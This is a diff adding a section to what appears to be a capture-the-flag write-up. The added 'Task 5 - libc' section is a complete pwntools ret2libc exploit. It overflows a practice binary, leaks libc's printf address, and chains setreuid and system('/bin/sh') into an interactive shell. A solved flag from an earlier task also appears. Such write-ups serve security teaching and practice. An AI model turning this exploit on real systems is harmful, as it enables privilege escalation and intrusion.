@@ -165,4 +165,49 @@ Lock 3 is a gimmie. If you get the other 2, this should work.
 Here is you flag (hopefully):
 flag{Thr33_Tw0_D0N3}
 ```
+##Task 5 - libc
+
+```console
+from pwn import *
+
+context.update(arch='i386', os='linux')
+
+p = process("./leaked_lib")
+
+#useful locations
+leaky = 0x80485b9
+start = 0x8048566
+
+#rop exploit
+payload = cyclic(cyclic_find('laaa'))
+payload += p32(leaky)
+payload += p32(start)
+
+p.sendline(payload)
+
+recv_data = p.recvuntil("leak!")
+printf_addr = recv_data[44:54]
+
+libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
+printf_offset = libc.sym.printf
+
+libc_base = int(printf_addr, 16) - printf_offset
+print("address of libc:", hex(libc_base))
+
+libc.address = libc_base
+print("location of system:", hex(libc.sym.system))
+
+bin_sh = next(libc.search(b'/bin/sh'))
+rop = ROP(libc)
+rop.setreuid(1005, 1005)
+rop.system(bin_sh)
+rop.exit(0)
+
+payload2 = cyclic(cyclic_find("laaa"))
+payload2 += rop.chain()
+p.sendline(payload2)
+
+p.interactive()
+
+```
 
